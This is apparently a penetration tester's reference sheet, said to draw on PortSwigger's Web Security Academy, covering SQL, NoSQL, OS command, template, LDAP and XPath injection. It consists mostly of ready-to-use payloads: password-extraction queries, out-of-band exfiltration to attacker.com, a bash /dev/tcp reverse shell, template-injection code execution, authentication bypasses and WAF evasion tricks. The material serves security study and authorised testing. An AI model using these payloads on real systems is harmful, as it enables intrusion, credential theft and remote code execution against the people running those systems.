# SQL Injection & Injection Attacks — Complete Reference

> Based on PortSwigger Web Security Academy (2026-08)
> Complements `vuln-classes.md` (summary) with detailed attack patterns, payloads, and exploitation techniques.

## 1. SQL Injection (SQLi)

### 1.1 What It Is
SQLi lets an attacker interfere with database queries. Impact:
- **Unauthorized data access** — passwords, credit cards, PII
- **Data modification/deletion** — UPDATE/DELETE via injection
- **RCE** — via `xp_cmdshell` (MSSQL), UDF (MySQL), `COPY TO` (PostgreSQL), `UTL_FILE` (Oracle)
- **Auth bypass** — subvert login queries
- **File read/write** — `LOAD_FILE()` / `INTO OUTFILE`

### 1.2 Detection — Universal Test Payloads

```
'                          -- Error? SQLi
"                          -- Error? SQLi (double-quote variant)
\                          -- Error? Escape-based
' OR 1=1--                 -- Boolean true (always returns rows)
' OR 1=2--                 -- Boolean false (returns nothing)
' AND SLEEP(5)--           -- Time delay
' AND '1'='1               -- Always true (no comment needed)
' AND '1'='2               -- Always false
```

### 1.3 Injection Points (not just WHERE)

| Location | Example |
|----------|---------|
| WHERE clause | `WHERE id = 'INJECT'` |
| UPDATE value | `UPDATE users SET name='INJECT' WHERE id=1` |
| INSERT value | `INSERT INTO users VALUES('INJECT')` |
| ORDER BY | `ORDER BY INJECT` |
| Table/Column name | `SELECT INJECT FROM table` |
| UNION context | After determining column count |

### 1.4 Types of SQLi

#### 1.4.1 In-Band (Classic) — Data visible in response

**UNION-based:**
```sql
-- Step 1: Find column count
' ORDER BY 1--    -- works
' ORDER BY 2--    -- works
' ORDER BY 3--    -- ERROR → 2 columns

-- Step 2: Find string-compatible columns
' UNION SELECT NULL,NULL--                    -- matches column count
' UNION SELECT 'a',NULL--                     -- column 1 is string
' UNION SELECT NULL,'a'--                     -- column 2 is string

-- Step 3: Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

**Error-based:**
```sql
-- Extract via error messages
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--       -- MySQL
' AND 1=CONVERT(int,@@version)--                      -- MSSQL
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -- Oracle
```

#### 1.4.2 Blind — No visible query results

**Conditional responses (boolean-based):**
```sql
-- Test if condition affects response
xyz' AND '1'='1    -- "Welcome back" → true
xyz' AND '1'='2    -- no "Welcome back" → false

-- Extract character by character
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) > 'm
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 's
```

**Conditional errors:**
```sql
-- Trigger error only when condition is true
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a    -- ERROR (true)
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a    -- no error (false)
```

**Time-based:**
```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s') WAITFOR DELAY '0:0:5'--

-- Oracle
' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=1--
```

**Out-of-band (DNS):**
```sql
-- MySQL (requires FILE privilege + DNS server)
' AND LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a'))--

-- MSSQL
'; EXEC xp_dirtree '\\attacker.com\share'--

-- Oracle (needs UTL_HTTP or DBMS_XMLQUERY)
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT USER FROM DUAL))=1--
```

#### 1.4.3 Second-Order
- Data is stored in DB, then used unsafely in a LATER query
- Detection: inject payload in registration/profile → trigger in different endpoint
- Example: `' OR 1=1--` in username → later admin panel queries `SELECT * FROM users WHERE name='INJECTED'`

### 1.5 Database Enumeration

```sql
-- Version
SELECT @@version           -- MySQL/MSSQL
SELECT version()           -- PostgreSQL
SELECT banner FROM v$version -- Oracle

-- Current database
SELECT database()          -- MySQL
SELECT current_database()  -- PostgreSQL

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()  -- MySQL
SELECT table_name FROM all_tables                                                -- Oracle
SELECT tablename FROM pg_tables WHERE schemaname='public'                       -- PostgreSQL

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'  -- MySQL
```

### 1.6 Database-Specific Quirks

| DB | Comment | String concat | Type error |
|----|---------|---------------|------------|
| MySQL | `-- ` (space required) or `#` | `CONCAT()` or `\|\|` | Can concatenate strings |
| MSSQL | `--` | `+` | No implicit conversion |
| PostgreSQL | `--` | `\|\|` | Strict typing |
| Oracle | `--` | `\|\|` | STRICT: `SELECT` needs `FROM` |

### 1.7 Advanced Techniques

**Stacked queries:**
```sql
'; SELECT * FROM users--    -- Execute multiple statements
```
⚠️ Most drivers don't support stacked queries over HTTP.

**Out-of-band exploitation:**
```sql
-- Use when in-band/blind not possible
-- Requires: outbound network access from DB server
-- MSSQL: xp_cmdshell, sp_OACreate
-- MySQL: LOAD_FILE with UNC path
-- Oracle: UTL_HTTP, DBMS_XMLQUERY
```

**Bypassing filters:**
```sql
-- Case variation: SeLeCt
-- Inline comments: SEL/**/ECT
-- URL encoding: %27%20OR%201%3D1
-- Double encoding: %2527%2520OR%25201%253D1
-- Non-standard null bytes: %00
-- Unicode: \u0027 (single quote)
```

---

## 2. NoSQL Injection

### 2.1 Syntax Injection (MongoDB)

**Detection:**
```javascript
// Fuzz string
'"`{$\n};\r\n$Foo}\n$Foo \xYZ\x00

// Test individual characters
'                                    // Breaks query syntax?
' && 0 && 'x                        // False condition → different response
' && 1 && 'x                        // True condition → normal response

// Override condition (always true)
' || '1'=='1

// Null byte trick (ignore rest of query)
fizzy' || '1'=='1'\x00
```

### 2.2 Operator Injection (MongoDB)

**Attack via JSON API:**
```json
// Normal query
{"username": "admin", "password": "secret"}

// Bypass with $ne (not equal)
{"username": "admin", "password": {"$ne": ""}}

// Bypass with $gt (greater than)
{"username": "admin", "password": {"$gt": ""}}

// Regex-based extraction
{"username": "admin", "password": {"$regex": "^a"}}     // starts with 'a'
{"username": "admin", "password": {"$regex": "^admin"}} // full password
```

**Bypass authentication via URL:**
```
login?username=admin&password[$ne]=
login?username=admin&password[$regex]=^a*
```

### 2.3 Operator Injection (Other NoSQL)

**CouchDB:**
```json
{"$and": [{"username": "admin"}, {"password": {"$regex": "^a"}}]}
```

**Redis (if used as query backend):**
```
*                         -- list all keys
KEYS *                    -- enumerate
GET user:admin:password   -- direct read
```

---

## 3. OS Command Injection

### 3.1 Detection

**Test payloads:**
```
& echo aiwefwlguh &         -- Separator test
; echo aiwefwlguh;          -- Semicolon test
| echo aiwefwlguh           -- Pipe test
|| echo aiwefwlguh          -- OR test
`echo aiwefwlguh`           -- Backtick test
$(echo aiwefwlguh)          -- Subshell test
```

**Confirm execution:**
```
& ping -c 10 127.0.0.1 &    -- Time delay (10 seconds)
```

### 3.2 Separator Reference

| Separator | Behavior | Example |
|-----------|----------|---------|
| `&` | Execute sequentially | `cmd1 & cmd2` |
| `&&` | Execute if first succeeds | `cmd1 && cmd2` |
| `|` | Pipe output | `cmd1 \| cmd2` |
| `||` | Execute if first fails | `cmd1 \|\| cmd2` |
| `;` | Execute sequentially | `cmd1 ; cmd2` |
| `` `cmd` `` | Subshell | `` `cmd` `` |
| `$(cmd)` | Subshell | `$(cmd)` |
| `%0a` | Newline injection | `cmd1%0acmd2` |

### 3.3 Useful Commands

| Purpose | Linux | Windows |
|---------|-------|---------|
| Current user | `whoami` | `whoami` |
| OS info | `uname -a` | `ver` |
| Network config | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |
| Directory listing | `ls -la` | `dir` |
| Read file | `cat /etc/passwd` | `type C:\Windows\System32\drivers\etc\hosts` |
| Write file | `echo payload > /tmp/file` | `echo payload > C:\temp\file` |

### 3.4 Blind Command Injection

**Time-based:**
```bash
& ping -c 10 127.0.0.1 &
; ping -n 10 127.0.0.1 ;
```

**Output redirect to web root:**
```bash
& whoami > /var/www/static/whoami.txt &
```

**Out-of-band via DNS:**
```bash
& nslookup `whoami`.attacker.com &
```

**Linux reverse shell:**
```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Windows reverse shell:**
```powershell
powershell -c "New-Object System.Net.Sockets.TCPClient('attacker.com',4444)"
```

### 3.5 Bypass Filters

| Filter | Bypass |
|--------|--------|
| Space | `%09` (tab), `$IFS`, `{cmd,arg}` (bash) |
| Keywords | `$'\x63\x61\x74'` (hex for `cat`), base64 |
| Blacklist chars | Double encode: `&` → `%26`, `\|` → `%7C` |
| WAF strict | Newline injection: `%0a` |
| Without spaces | `{cat,/etc/passwd}` (bash brace expansion) |

---

## 4. Server-Side Template Injection (SSTI)

### 4.1 Detection

```
{{7*7}}                    → 49 = vulnerable (Jinja2, Twig, Nunjucks)
${7*7}                     → 49 = vulnerable (Mako, Pebble)
#{7*7}                     → 49 = vulnerable (Ruby ERB)
<%= 7*7 %>                 → 49 = vulnerable (ERB)
#{ 7*7 }                   → 49 = vulnerable (Thymeleaf)
```

### 4.2 RCE Payloads

**Jinja2 (Python):**
```
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate() }}
```

**Freemarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Thymeleaf (Java):**
```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

---

## 5. LDAP Injection

### 5.1 Detection

```
*                       -- Wildcard
admin*                  -- Prefix match
admin)(|(cn=*
*)()                   -- Always true
*(&(objectClass=*      -- Null character bypass
```

### 5.2 Bypass Auth

```
Username: *)(objectClass=*
Password: anything
```

---

## 6. XPath Injection

```
' or '1'='1
' or 1=1--
' or 'a'='a
') or ('a'='a
' or /*=1
```

---

## 7. Injection Cheat Sheet (Quick Reference)

### Universal Fuzz Strings
```
'
"
\
'
" \
;`
||"
||`
'||'
' || '
' or '1'='1
' or '1'='1'--
" or "1"="1
" or "1"="1"--
' or 1=1--
' or 1=1#
admin' --
admin' #
' UNION SELECT 1,2,3--
```

### WAF Bypass (Common)
```sql
-- Double URL encoding: %2527
-- Unicode: %u0027
-- Case mixing: UnIoN SeLeCt
-- Inline comments: UN/**/ION SE/**/LECT
-- Newline injection: %0a
-- Null byte: %00
-- Chunked transfer encoding
-- JSON/Unicode params
-- HTTP/2 smuggling
```

### Tool Integration
- **SQLMap**: `sqlmap -u "URL?id=1" --batch --dbs`
- **Burp Intruder**: Automate blind extraction
- **GHDB**: Google Dorks for SQL errors: `intext:"sql syntax" + "mysql"`
- **sqlmap tamper**: `--tamper=space2comment,between,randomcase`
